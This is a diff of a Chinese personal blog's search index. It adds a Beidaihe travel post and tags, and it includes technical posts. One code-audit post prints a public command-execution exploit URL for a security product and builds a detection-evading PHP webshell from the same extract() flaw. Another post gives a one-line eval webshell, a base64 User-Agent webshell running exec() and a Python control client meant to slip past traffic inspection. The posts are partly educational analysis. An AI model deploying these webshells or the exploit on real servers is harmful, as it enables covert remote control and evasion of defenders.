@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>北戴河之旅</title>
+    <link href="/2020/10/09/%E5%8C%97%E6%88%B4%E6%B2%B3%E4%B9%8B%E6%97%85/"/>
+    <url>/2020/10/09/%E5%8C%97%E6%88%B4%E6%B2%B3%E4%B9%8B%E6%97%85/</url>
+    
+    <content type="html"><![CDATA[<h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>今天年的国庆节并未想好去哪？上海、三亚、威海。。。。很多地方在我脑中闪过，因为从小在内陆长大一直对大海有一直莫名的向往。但国庆又是一个很特别的期间，游客之多难以想象。再一次朋友的推荐下，我选择了北戴河。</p><h3 id="行程规划"><a href="#行程规划" class="headerlink" title="行程规划"></a>行程规划</h3><p>出发地:<code>北京站</code><br>目的地:<code>北戴河站</code><br>时间:<code>2小时</code></p><h3 id="酒店住宿"><a href="#酒店住宿" class="headerlink" title="酒店住宿"></a>酒店住宿</h3><p>地点:<code>南戴河金海岸</code><br>价格:<code>350左右/天</code></p><h3 id="鸽子窝公园"><a href="#鸽子窝公园" class="headerlink" title="鸽子窝公园"></a>鸽子窝公园</h3><p>网上说，鸽子屋的日出是很美的。但我早上并没有起来，就在酒店看了看日出，海上的日出确实让我眼前一亮，很美。<br>收拾完后，到了鸽子屋大概10点左右，相对其他地方的景点来说，人数应该算是一吧。门票价25元一位，价格很亲民。<br>我和女朋友一起去的，沙滩上一边走一边看海鸽子，偶而不远的地方还有一片小礁石，很多大人带着小孩在那里抓螃蟹、皮皮虾、贝壳。</p><h3 id="刘庄夜市"><a href="#刘庄夜市" class="headerlink" title="刘庄夜市"></a>刘庄夜市</h3><p>刘庄夜市距离鸽子屋坐公交车只有2站的距离，不是很远。这里主要是个小吃的地方，东西的感觉较贵一些，味道整体给4颗星吧，还行。<br>不过这里的建筑分格很有特色，繁华中不失唯美。</p><h3 id="碧螺岛"><a href="#碧螺岛" class="headerlink" title="碧螺岛"></a>碧螺岛</h3><p>碧螺岛位于黄金海岸对面，距离酒店很近。但需要乘坐缆车过去，票价是95，还包括一个海上游船票，我个人觉的游船不太好玩。<br>但是缆车还是相当不错的，坐在缆车上，在高空眺望大海。。。。。</p><h3 id="南戴河金海岸"><a href="#南戴河金海岸" class="headerlink" title="南戴河金海岸"></a>南戴河金海岸</h3><p>大概下午5点中左右，延着黄金海岸一直往南走去，不远处你会发现一个渔民出海归来的地方。此时正是渔民打鱼归来，夕阳照射下的渔船是那么的唯美，<br>接着一框一筐的海鲜被搬上岸来，有螃蟹、海星、拳头大的海螺等等。。。。由于我正好10月份去，刚好赶上梭子蟹正肥的时候。<br>从渔民手里购买会比市场便宜很多而且又新鲜，如果你砍价的能力强的话，200多可以买很多东西。</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>旅行</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>简单的Telegram机器人</title>
     <link href="/2020/09/20/%E7%AE%80%E5%8D%95%E7%9A%84Telegram%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
     <url>/2020/09/20/%E7%AE%80%E5%8D%95%E7%9A%84Telegram%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
@@ -11,6 +30,12 @@
     <content type="html"><![CDATA[<h2 id="Telegram"><a href="#Telegram" class="headerlink" title="Telegram"></a>Telegram</h2><p>闲来无事！！！！，做了一个简单的Telegram BOT!<br>闲来无事! ! ! !，做了一个简单的Telegram BOT，该机器人目前支持一些简单的加解密功能，还有数字货币买入卖出点的简单计算功能!<br>机器人订阅ID<br>@yll1122_bot</p><h3 id="常规无杠杆计算"><a href="#常规无杠杆计算" class="headerlink" title="常规无杠杆计算"></a>常规无杠杆计算</h3><p>输入: 盈利<code>s</code> 输入的买入币价<code>x</code> 买入总金额<code>base</code> </p><p>首先先计算出买入的数量:<br><code>number = base / x</code><br>这样再去计算预计卖出币价y1:<br>预计获利 = (预计卖出币价y1 * 买入数量number) - (当前买入币价x * 买入数量number) - (预计卖出总价<code>买入卖出两次交易手续费</code>*交易手续费率)<br><code>s = y1 * number - x * number - (y1+x) * number *0.002(方程)</code><br>预计卖出价(赚s利润):<code>y1 = (s + 1.002 * x * number) / (0.998  * number)</code><br>涨跌百分比:<code>n = (y1-x) / x</code><br>预计卖出价(赔s利润):<code>y2 = (-s + 1.002 * x * number) / (0.998  * number)</code><br><img src="/images/telegram/2.png">  </p><h3 id="逐仓杠杆计算-做空"><a href="#逐仓杠杆计算-做空" class="headerlink" title="逐仓杠杆计算(做空)"></a>逐仓杠杆计算(做空)</h3><p>在杠杆中存在几个关键的数字，以做空为例，爆仓触发风险率R=110％。当前买入价x，预计卖出币价y1，爆仓价p，天数day，杠杆倍数n，本金定为base，借币数量number，pi。<br>输入: 盈利<code>s</code> 倍数<code>bei</code> 当前卖出价格<code>x</code> 本金<code>base</code> 天数<code>day</code><br>借币数量: <code>number = (base/x) * bei</code><br>预计获利 = (当前卖出币价x * 借入数量number) - (预计当前买入币价y1 * 借入数量number) - (预计卖出总价<code>买入卖出两次交易手续费</code><em>交易手续费) - (当前买入币价x * 借入数量number * 利率 * 天数)<br>方程 <code>s = (x * number) - (y1 * number) - ((x + y1) * number * 0.002) - (y1 * number * 0.00098 * day)</code><br>预计卖出价(赚s利润): <code>y1 = ((0.998 * number * x) - s) / ((1.002 + (0.00098*day) ) * number * day)</code><br>涨跌百分比: <code>n = (y1-x) / x</code><br>预计卖出价(赔s利润): <code>y2 = ((0.998 * number * x) + s) / ((1.002 + (0.00098*day) ) * number * day)</code><br>风险率计算公式: (担保资产+当前借币金额)/(未来借币金额+未还币息)*100%<br>1.1 = (本金a + 借贷数量t</em>当前卖币价x)/(借贷数量t<em>预计买入价y1+借贷数量t</em>预计买入y1*0.00098) * 100%<br>方程 <code>1.1 = (base + (x * number)) / (y1 * number + (y1 * number *0.00098 * day)) * 100%</code><br><code>y1 * number + (y1 * number *0.00098 * day) = ((base + (x * number)) / 1.1) / (number * (1 + (0.00098 * day))</code><br>爆仓价: <code>y1 = p =  ((base + (x * number)) / 1.1) / (number * (1 + 0.00098 + day))</code><br>风险率: <code>k = (base + (p1 * number)) / (x * number + (x * number * 0.00098 * day))</code><br><img src="/images/telegram/2.png">  </p><h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h3><p>使用的框架:<a href="https://github.com/python-telegram-bot/python-telegram-bot">https://github.com/python-telegram-bot/python-telegram-bot</a> <code>机器人python开发框架</code></p><p>本地项目地址:<a href="https://github.com/YLL-F1/telegram_bot">https://github.com/YLL-F1/telegram_bot</a></p>]]></content>
     
     
+    
+    <tags>
+      
+      <tag>开发</tag>
+      
+    </tags>
     
   </entry>
   
@@ -25,6 +50,12 @@
     
     
     
+    <tags>
+      
+      <tag>二进制安全</tag>
+      
+    </tags>
+    
   </entry>
   
   
@@ -37,6 +68,12 @@
     <content type="html"><![CDATA[<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>最近hw的举行区间，某服爆出一起神奇的漏洞。那咱就对他的代码分析分析是怎么产生的这个漏洞点。 </p><ul><li>据网上公开的paylaod显示，该漏洞利用方式难度较低。</li></ul><p><code>https://x.x.x.x/tool/log/c.php?strip_slashes=system&amp;host=id</code>  </p><p><img src="/images/edr/1.png">  </p><h2 id="原代码分析"><a href="#原代码分析" class="headerlink" title="原代码分析"></a>原代码分析</h2><h3 id="php变量覆盖"><a href="#php变量覆盖" class="headerlink" title="php变量覆盖"></a>php变量覆盖</h3><p>应为这个漏洞点源自于php中的变量覆盖，也就是自定义的参数值替换原有变量值的情况，也称为变量覆盖漏洞。</p><pre><code class="hljs aidl">&lt;?php$a &#x3D; 1;    &#x2F;&#x2F;原变量值为1extract(array(&#39;a&#39; &#x3D;&gt; &#39;3&#39;));&#x2F;&#x2F;经过extract()函数对$b处理后echo $a;    &#x2F;&#x2F;输出结果为3?&gt;</code></pre><h3 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h3><p>根据payload分析，该漏洞点定存在于c.php代码中，首先先看下show_form函数。不难发现show_form的所接受的参数$params可以被extract函数进行变量覆盖。</p><p><img src="/images/edr/2.png">  </p><h3 id="可变量输入"><a href="#可变量输入" class="headerlink" title="可变量输入"></a>可变量输入</h3><p>那既然extract可以进行变量覆盖，所以就要寻找show_form($params)所接受的参数是否为可变量，或如何构造可变量。接着往下走$show_form($_REQUEST)这段函数让$params成为可能。<br><img src="/images/edr/3.png">  </p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>既然已经有了可控变量，那如何构造出所需的payload？$strip_slashes($host)该函数其实已经帮我们完成了构造，直接用即可。在传入所需参数后该函数就变为system(id)，所以只需变host即可。<br><img src="/images/edr/4.png">  </p><h2 id="免杀webshell"><a href="#免杀webshell" class="headerlink" title="免杀webshell"></a>免杀webshell</h2><p>既然知道了原理，就顺手写一个webshell看看其是否拥有免杀功能。哈哈哈。</p><pre><code class="aidl">&lt;?php    function kk($params)&#123;    extract($params);    $qq($jj);&#125;;kk($_REQUEST);?&gt;</code></pre><p><img src="/images/edr/5.png"><br>D盾测试，效果还可以。<br><img src="/images/edr/6.png"> </p>]]></content>
     
     
+    
+    <tags>
+      
+      <tag>web安全</tag>
+      
+    </tags>
     
   </entry>
   
@@ -51,6 +88,12 @@
     
     
     
+    <tags>
+      
+      <tag>美食</tag>
+      
+    </tags>
+    
   </entry>
   
   
@@ -63,6 +106,12 @@
     <content type="html"><![CDATA[<h2 id="webshell是什么？"><a href="#webshell是什么？" class="headerlink" title="webshell是什么？"></a>webshell是什么？</h2><p>刚刚接触安全的时候，对于webshell这个概念还是十分的惊奇。只记得当时带课的老师才测试网站上传了一个php文件（老师说是webshell），然后用了一个软件就直接可以控制测试网站了。当时觉的真TM的牛皮，那时起觉的安全还挺有意思的。  </p><h3 id="回忆复现"><a href="#回忆复现" class="headerlink" title="回忆复现"></a>回忆复现</h3><p><font size=1 color=Blue><em>到底websehll是什么？那就来回忆下当前的情景。</em></font><br>工具: phpstudy、菜刀、一句话webshell<code>&lt;?php eval(@$_POST[&#39;a&#39;]); ?&gt;</code>。<br>操作流程:    </p><ul><li>将webshell保存为后缀为.php的文件并上传到相应的web目录下。  </li></ul><p><img src="/images/2020-8-6/yijuhua.png"></p><ul><li>使用中国菜刀进行连接  </li></ul><blockquote><p>中国菜刀 是一款由中国大牛开发的webshell后门管理工具。配置简便、功能强大、使用方便，可以说是一款强大好用的“web管理工具”。   </p></blockquote><p><img src="/images/2020-8-6/caidao_config.png"></p><p><img src="/images/2020-8-6/caidao.png"></p><h3 id="菜刀分析"><a href="#菜刀分析" class="headerlink" title="菜刀分析"></a>菜刀分析</h3><ul><li>在菜刀客户端中输入ipconfig命令，然后通过winshark抓包分析菜刀运行的原理。  </li></ul><p><img src="/images/2020-8-6/ipconfig.png">  </p><p><img src="/images/2020-8-6/caidao_pcap.png">  </p><ul><li>菜刀将执行的命令通过base64加密传入webshell中，对psot字段进行base64解密看看其详情信息<a href="https://blog.csdn.net/gscaiyucheng/article/details/24911375">(菜刀分析参加文章)</a>。  </li></ul><p><img src="/images/2020-8-6/base64.png">  </p><ol><li><p>@ini_set(“display_errors”,”0”);临时关闭PHP的错误显示功能</p></li><li><p>@set_time_limit(0);防止像dir、上传文件大马时超时</p></li><li><p>@set_magic_quotes_runtime(0);关闭魔术引号，这东西在4.0以后就不怎么用了</p></li><li><p>$p=’cmd’;执行cmd</p></li><li><p>$s=’cd /d D:\&amp;ipconfig&echo;执行ipconfg并输出</p></li></ol><h3 id="一句话分析"><a href="#一句话分析" class="headerlink" title="一句话分析"></a>一句话分析</h3><p><code>&lt;?php eval(@$_POST[&#39;a&#39;]); ?&gt;</code><br>为什么如此简单的一句话就可以拥有如此神奇的力量，让他足以控制一台计算机。其实是计算机语言的魅力，每一种计算机语言都是为操作计算机系统而生。当然webshell也是计算机语言所写，其又被称为服务器控制端，那如过被攻击者利用就被称之为shell了。  </p><ul><li><p>以php语言为案例，攻击者通过各种函数、变量拼接，从而构造出命令执行函数，php 常见命令执行函数: </p><pre><code class="hljs aidl">$&#123;&#125;Eval()Assert()preg_replace()create_function()array_map()call_user_func()&#x2F;call_user_func_array()array_filter()usort(),uasort()</code></pre></li><li><p>通过post传入payload执行命令并回显<br><img src="/images/2020-8-6/post.png">  </p></li><li><p>winshark抓包<br><img src="/images/2020-8-6/post_pcap.png">  </p></li></ul><p>相信看到这一步应该对webshell有一个大概的了解，简单理解了webshell的执行原理。</p><h2 id="流量加密"><a href="#流量加密" class="headerlink" title="流量加密"></a>流量加密</h2><p>目前市场上的安全设备对于恶意数据流都可精准检测其特征，而常规的一句话木马、菜刀等特征过于明显。而且大部分的黑客工具都被列入特征库，所以攻击方的攻击手法很容易被针对，攻击链路也很容易被还原。</p><h3 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h3><p>常规的webshell是将所需的payload通过post进行传参，很容易被流量设备检测。当然，你也可以使用其他地方进行传参。</p><ul><li>例如：user_agent加密进行传参，然后再解密执行命令。   </li></ul><p><img src="/images/2020-8-6/post_encrypt.png">  </p><ul><li>winshark抓包  </li></ul><p><img src="/images/2020-8-6/post_encrypt_pcap.png">   </p><h3 id="webshell源码"><a href="#webshell源码" class="headerlink" title="webshell源码"></a>webshell源码</h3><pre><code class="hljs aidl">&lt;?php$dd &#x3D; $_SERVER[&#39;HTTP_USER_AGENT’];&#x2F;&#x2F;获取user_agent参数$qq &#x3D; base64_decode($dd);&#x2F;&#x2F;解密user_agent参数$jjj &#x3D; exec ($qq,$out);&#x2F;&#x2F;执行user_agent参数for ($i&#x3D;0 ;$i &lt; count($out) ;$i++)&#123;    $ls &#x3D; $ls.$out[$i].&quot;\n&quot;;&#125;echo base64_encode($ls);&#x2F;&#x2F;加密输入执行后的系统命令?&gt;</code></pre><h3 id="客户端源码"><a href="#客户端源码" class="headerlink" title="客户端源码"></a>客户端源码</h3><p>当然用浏览器手工去输入shell着实不太方便，写一个简单的控制脚本。</p><pre><code class="hljs aidl">#!&#x2F;usr&#x2F;bin&#x2F;python# -*- coding: UTF-8 -*-import requestsimport base64str_1 &#x3D; &quot;&quot;headers &#x3D; &#123;        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8&quot;,        &quot;User-Agent&quot;: &quot;adwd&quot;,        &quot;Accept&quot;:&quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&quot;,        &quot;Accept-Language&quot;:&quot;zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2&quot;,        &quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;    &#125;while True:    str_1 &#x3D; input(&quot;please input cmd:&quot;)    str_1 &#x3D; bytes(str_1, encoding&#x3D;&quot;gbk&quot;)    str_1 &#x3D; base64.b64encode(str_1)    headers[&#39;User-Agent&#39;]&#x3D;str_1    ls &#x3D; requests.get(url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php&quot;,headers&#x3D;headers)#url更改位置    ls_1 &#x3D; ls.content    ls_1 &#x3D; base64.b64decode(ls_1)    ls_2 &#x3D; str (ls_1, encoding&#x3D;&quot;gbk&quot;)    print (ls_2)</code></pre><h2 id="流量混淆"><a href="#流量混淆" class="headerlink" title="流量混淆"></a>流量混淆</h2><p>上面的加密user_agent的特征还是较为明显。新思路:客户端将所需的payload通过base64加密进行拆分，嵌入正常的user_agent中，然后传入服务器。Webshell再从user_agent中提取payload解密执行，将回显命令通过base64+assic移位进行加密输出。客户端再对加密回显进行解密。 </p><h3 id="使用详情"><a href="#使用详情" class="headerlink" title="使用详情"></a>使用详情</h3><p>通过上面思路，分别编写了php与jsp的webshell，还有python客户端。当然目前并不支持文件上传，和其他高级功能，后续再持续更新。<br><a href="https://github.com/YLL-F1/--jsp-php">源码下载</a><br><img src="/images/2020-8-6/complete.png">  </p><p><img src="/images/2020-8-6/complete_pcap.png">  </p>]]></content>
     
     
+    
+    <tags>
+      
+      <tag>web安全</tag>
+      
+    </tags>
     
   </entry>
   
@@ -77,6 +126,12 @@
     
     
     
+    <tags>
+      
+      <tag>开发</tag>
+      
+    </tags>
+    
   </entry>
   
   
@@ -89,6 +144,12 @@
     <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>  之前一直在第三方记录生活与工作所碰到的故事，但是由于种种原因，第三方所提供的服务总是出现问题。<a href="https://www.jianshu.com/u/48db49c4aa0a">之前的博客</a></p><h2 id="example"><a href="#example" class="headerlink" title="example:"></a><em>example:</em></h2><p>  服务器正在维护中，您的文章目前处于维护状态，您的的文章目前处于审核状态。。。。。  所以，我找了大量的博客搭建资料。发现github原来是一个相当不错的博客搭建平台，既不需要购买VPS，也不需要购买域名，并且又方便转移。</p><h4 id="自律"><a href="#自律" class="headerlink" title="自律"></a>自律</h4><p>当然写博客也是为了提高自己的自律性。因为好多时候总是把时间浪费在LOL、手游、抖音等等上，感觉有那么一点点荒废（哈哈）。所以说想把这些时间用在博客身上，也未必不是一件很有意义的事情。当然我要严格要求自己每周更新一篇文章，内容不限（技术、生活、运动、旅行、风景等），让生活变的更有意义。</p>]]></content>
     
     
+    
+    <tags>
+      
+      <tag>开发</tag>
+      
+    </tags>
     
   </entry>
   
